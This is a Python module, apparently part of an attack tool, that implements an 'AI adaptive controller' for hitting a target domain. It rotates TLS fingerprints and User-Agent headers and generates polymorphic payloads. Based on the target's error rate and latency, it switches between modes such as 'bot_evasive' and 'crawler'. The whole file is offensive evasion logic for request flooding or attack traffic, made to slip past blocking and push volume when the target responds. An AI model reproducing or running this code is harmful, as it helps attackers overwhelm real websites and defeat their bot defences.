import logging
import asyncio
import json
import os
import time
from typing import Dict, Any, List
from .mimic_engine import MimicEngine
from .recon_consumer import ReconDataConsumer
from .endpoint_selector import EndpointSelector
from .tls_rotator import TLSProfileManager

class AdaptiveController:
    """
    Manages real-time attack adaptation using shared metrics.
    """
    def __init__(self, target_domain: str, metrics: Any):
        self.target_domain = target_domain
        self.metrics = metrics # Shared reference to FixedMetrics
        self.logger = logging.getLogger("AdaptiveController")
        
        # Core AI Modules
        self.mimic = MimicEngine()
        self.recon = ReconDataConsumer(target_domain)
        self.selector = EndpointSelector(target_domain, self.recon.recon_data)
        self.tls_mgr = TLSProfileManager()
        
        # State
        self.current_behavior = "casual_browser"
        self.is_adapting = False
        self.attack_plan = self.recon.generate_attack_plan()

    def get_next_parameters(self, base_config: Dict) -> Dict:
        """
        Returns optimized parameters for the next batch of requests.
        """
        delay = self.mimic.get_delay(self.current_behavior)
        profile = self.tls_mgr.get_random_profile()
        
        # Merge headers from mimic and TLS profile
        headers = self.mimic.get_adaptive_headers(base_config.get("headers", {}))
        headers["User-Agent"] = profile["user_agent"]
        
        return {
            "behavior": self.current_behavior,
            "delay": delay,
            "headers": headers,
            "payload": self.mimic.generate_polymorphic_payload(base_config.get("payload", {})),
            "tls_profile": profile
        }

    async def run_loop(self):
        """
        Background loop for continuous adaptation and status reporting.
        Uses real metrics from the shared metrics object.
        """
        self.is_adapting = True
        self.logger.info(f"[*] AI Adaptive Controller active for {self.target_domain}")
        
        start_time = time.monotonic()
        while self.is_adapting:
            summary = self.metrics.get_summary()
            attempted = summary["attempted"]
            
            if attempted > 0:
                avg_lat = summary["avg_latency_ms"]
                err_rate = summary["error_rate"]
                
                self.logger.info(f"[AI] Mode: {self.current_behavior} | Avg Latency: {avg_lat:.2f}ms | Err Rate: {err_rate*100:.1f}%")
                
                # Adaptation Logic based on REAL data
                if err_rate > 0.8:
                    # Target is blocking or timing out heavily
                    self.current_behavior = "bot_evasive"
                elif err_rate > 0.4:
                    # High failure rate, try to be more like a browser
                    self.current_behavior = "casual_browser"
                elif avg_lat > 3000:
                    # Target is slow but responding, use power user to push further
                    self.current_behavior = "power_user"
                else:
                    # Clean response, go for volume
                    self.current_behavior = "crawler"
            else:
                # Check if we've been running for a while with zero requests
                # Increased patience to 30s to allow for DNS + Recon + Benchmark
                if time.monotonic() - start_time > 30:
                    self.logger.critical("Zero requests captured by AI. Check engine connection.")
                    # Don't stop, just keep waiting. Maybe it's just a slow target.
                    
            await asyncio.sleep(5)

    def stop(self):
        self.is_adapting = False
